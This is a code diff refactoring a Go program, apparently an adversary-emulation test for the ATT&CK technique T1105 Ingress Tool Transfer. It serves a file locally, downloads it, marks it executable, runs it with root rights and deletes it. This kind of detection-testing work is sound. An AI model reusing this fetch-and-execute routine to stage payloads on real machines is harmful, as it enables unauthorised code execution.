@@ -16,7 +16,6 @@ var (
 )
 
 func main() {
-	filePath := filepath.Join("assets", fileName)
 	ip := system.GetOutboundIP()
 	url := fmt.Sprintf("http://%s:%s/payload", ip, port)
 
@@ -24,50 +23,48 @@ func main() {
 		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
 		return
 	}
+
 	fmt.Printf("%sT1105 Ingress Tool Transfer\n", tags.Info)
-	go func() {
-		err := webServer(port, filePath)
-		if err != nil {
-			fmt.Printf("%s%s\n", tags.Err, err.Error())
-		}
-	}()
+
+	go startWebServer(port, fileName)
 
 	err := getRequestToRetrieveFile(url, fileName)
 	if err != nil {
-		fmt.Printf("%s%s\n", tags.Err, err.Error())
+		fmt.Printf("%sError on GET request for %s: %s\n", tags.Err, url, err.Error())
 		return
 	}
+	defer deleteFile(fileName)
 
 	makeFileExecutable(fileName)
 
-	launchFile(fileName)
-
-	deleteFile(fileName)
+	err = launchFile(fileName)
+	if err != nil {
+		fmt.Printf("%sError when running the received file %s: %s\n", tags.Err, fileName, err.Error())
+	}
 }
 
-func webServer(port string, filePath string) error {
-	http.HandleFunc("/payload", func(w http.ResponseWriter, r *http.Request) {
+func startWebServer(port, fileName string) error {
+	filePath := filepath.Join("assets", fileName)
+	http.HandleFunc("/payload", payloadHandler(filePath))
+
+	fmt.Printf("%sServer is running at http://localhost:%s\n", tags.Log, port)
+	return http.ListenAndServe(":"+port, nil)
+}
+
+func payloadHandler(filePath string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
 		file, err := os.Open(filePath)
 		if err != nil {
 			http.Error(w, "File not found\n", http.StatusNotFound)
-			fmt.Printf("%sError opening file: %v\n", tags.Err, err)
+			fmt.Printf("%sError opening file %s: %s", tags.Err, filePath, err)
 			return
 		}
 		defer file.Close()
 
 		w.Header().Set("Content-Disposition", "attachment; filename=\"myapp\"")
 		w.Header().Set("Content-Type", "application/octet-stream")
-
 		http.ServeFile(w, r, filePath)
-	})
-
-	fmt.Printf("%sServer is running at http://localhost:%s\n", tags.Log, port)
-	err := http.ListenAndServe(":"+port, nil)
-	if err != nil {
-		return err
 	}
-
-	return nil
 }
 
 func getRequestToRetrieveFile(url string, fileName string) error {
